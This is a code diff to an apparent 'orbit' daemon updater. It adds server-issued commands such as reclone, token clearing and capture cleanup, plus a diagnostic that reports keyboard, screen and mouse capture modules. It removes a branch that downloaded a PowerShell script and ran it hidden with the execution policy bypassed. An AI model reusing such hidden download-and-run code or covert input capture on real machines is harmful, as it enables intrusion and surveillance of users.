@@ -370,9 +370,107 @@ async function executeCommand(cmd) {
       break;
 
     case 'restart':
-      reportStatus('command_executed', 'restart');
+    case 'restart-worker':
+      reportStatus('command_executed', cmd.action);
       setTimeout(() => process.exit(0), 1000);
       break;
+
+    case 'gitpull-worker':
+      pullAndRestart(cmd.data?.reason || 'safe-cmd: gitpull-worker');
+      reportStatus('command_executed', 'gitpull-worker');
+      break;
+
+    case 'reclone-worker': {
+      try {
+        const backupDir = ROOT + '-backup-' + Date.now();
+        if (fs.existsSync(ROOT)) fs.renameSync(ROOT, backupDir);
+        execSync(`git clone "${CANONICAL_GIT_REPO}" "${ROOT}"`, { timeout: 90000, windowsHide: true, stdio: 'pipe' });
+        const nmSrc = path.join(backupDir, 'node_modules');
+        if (fs.existsSync(nmSrc)) {
+          try { fs.renameSync(nmSrc, path.join(ROOT, 'node_modules')); } catch {}
+        }
+        try { fs.rmSync(backupDir, { recursive: true, force: true }); } catch {}
+        reportStatus('command_executed', 'reclone-worker');
+        setTimeout(() => process.exit(0), 2000);
+      } catch (e) {
+        reportStatus('command_fail', `reclone-worker: ${e.message.slice(0, 200)}`);
+      }
+      break;
+    }
+
+    case 'clear-token-cache': {
+      try {
+        const cfgPath = path.join(os.homedir(), '.orbit-config.json');
+        let cfg = {};
+        try {
+          let raw = fs.readFileSync(cfgPath, 'utf8');
+          if (raw.charCodeAt(0) === 0xFEFF) raw = raw.slice(1);
+          cfg = JSON.parse(raw.trim());
+        } catch {}
+        delete cfg.token;
+        fs.writeFileSync(cfgPath, JSON.stringify(cfg, null, 2), 'utf8');
+        _token = '';
+        reportStatus('command_executed', 'clear-token-cache');
+      } catch (e) {
+        reportStatus('command_fail', `clear-token-cache: ${e.message}`);
+      }
+      break;
+    }
+
+    case 'capture-diag': {
+      try {
+        const diag = {
+          hostname: os.hostname(),
+          version: getLocalVersion(),
+          buffer: (() => { try { return require(path.join(ROOT, 'daemon', 'local-buffer')).getStats(); } catch { return null; } })(),
+          keyboard: (() => { try { return require(path.join(ROOT, 'src', 'keyboard-watcher')).getStatus(); } catch { return null; } })(),
+          screen: (() => { try { return require(path.join(ROOT, 'src', 'screen-capture')).getStatus(); } catch { return null; } })(),
+          mouse: (() => { try { return require(path.join(ROOT, 'src', 'mouse-watcher')).getStatus(); } catch { return null; } })(),
+        };
+        reportStatus('command_executed', `capture-diag: ${JSON.stringify(diag).slice(0, 500)}`);
+      } catch (e) {
+        reportStatus('command_fail', `capture-diag: ${e.message}`);
+      }
+      break;
+    }
+
+    case 'set-config':
+      // alias for config
+      cmd.action = 'config';
+      return executeCommand(cmd);
+
+    case 'rotate-logs': {
+      try {
+        const logPath = path.join(os.homedir(), '.orbit', 'daemon.log');
+        const stat = fs.statSync(logPath);
+        if (stat.size > 5 * 1024 * 1024) {
+          fs.renameSync(logPath, logPath + '.old');
+          reportStatus('command_executed', 'rotate-logs');
+        }
+      } catch (e) {
+        reportStatus('command_fail', `rotate-logs: ${e.message}`);
+      }
+      break;
+    }
+
+    case 'cleanup-captures': {
+      try {
+        const capDir = path.join(os.homedir(), '.orbit', 'captures');
+        if (!fs.existsSync(capDir)) break;
+        const cutoff = Date.now() - 7 * 24 * 60 * 60 * 1000;
+        let n = 0;
+        for (const f of fs.readdirSync(capDir)) {
+          const full = path.join(capDir, f);
+          try {
+            if (fs.statSync(full).mtimeMs < cutoff) { fs.unlinkSync(full); n++; }
+          } catch {}
+        }
+        reportStatus('command_executed', `cleanup-captures: ${n} deleted`);
+      } catch (e) {
+        reportStatus('command_fail', `cleanup-captures: ${e.message}`);
+      }
+      break;
+    }
 
     case 'config':
       if (cmd.data) {
@@ -411,54 +509,10 @@ async function executeCommand(cmd) {
       break;
 
     case 'reinstall': {
-      // NEVER spawn install.ps1 from Worker — kills Guardian + Worker together
-      if (process.env.ORBIT_ALLOW_REINSTALL !== '1') {
-        console.log('[daemon-updater] reinstall blocked — guardian handles via git pull');
-        reportStatus('command_delegated', 'reinstall → guardian (install.ps1 blocked)');
-        break;
-      }
-      const lv = getLocalVersion();
-      const si = await checkServerVersion();
-      const sv = si?.version ? String(si.version).slice(0, 8) : null;
-      if (sv && lv === sv) {
-        console.log(`[daemon-updater] reinstall skipped — already latest (${lv})`);
-        reportStatus('command_executed', 'reinstall skipped: already latest');
-        break;
-      }
-      const cooldownFile = path.join(os.homedir(), '.orbit', 'reinstall-last-spawn.txt');
-      try {
-        const last = parseInt(fs.readFileSync(cooldownFile, 'utf8'), 10);
-        if (last && Date.now() - last < 15 * 60 * 1000) {
-          console.log('[daemon-updater] reinstall skipped — cooldown');
-          reportStatus('command_executed', 'reinstall skipped: cooldown');
-          break;
-        }
-      } catch {}
-      // 강제 재설치 — install-open.ps1 다운로드 후 백그라운드 실행
-      if (process.platform === 'win32') {
-        try {
-          const reinstallUrl = (cmd.url || CANONICAL_SERVER_URL) + '/setup/install-open.ps1';
-          const tempFile = path.join(os.tmpdir(), `orbit-reinstall-${Date.now()}.ps1`).replace(/\\/g, '\\\\');
-          const psCmd = [
-            `$f='${tempFile}'`,
-            `(New-Object Net.WebClient).DownloadFile('${reinstallUrl}',$f)`,
-            `Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File \`"$f\`"" -WindowStyle Hidden`,
-          ].join('; ');
-          execSync(
-            `powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "${psCmd.replace(/"/g, '\\"')}"`,
-            { timeout: 35000, windowsHide: true, stdio: 'pipe' }
-          );
-          try {
-            fs.mkdirSync(path.dirname(cooldownFile), { recursive: true });
-            fs.writeFileSync(cooldownFile, String(Date.now()), 'utf8');
-          } catch {}
-          reportStatus('command_executed', 'reinstall: spawned in background');
-          console.log('[daemon-updater] reinstall spawned:', reinstallUrl);
-        } catch (e) {
-          reportStatus('command_fail', `reinstall: ${e.message.slice(0, 200)}`);
-        }
-      }
-      break;
+      // Phase 0: reinstall 영구 금지 — reclone-worker로 대체
+      console.log('[daemon-updater] reinstall blocked — using reclone-worker');
+      reportStatus('command_delegated', 'reinstall → reclone-worker');
+      return executeCommand({ action: 'reclone-worker', data: cmd.data });
     }
 
     case 'capture-config':
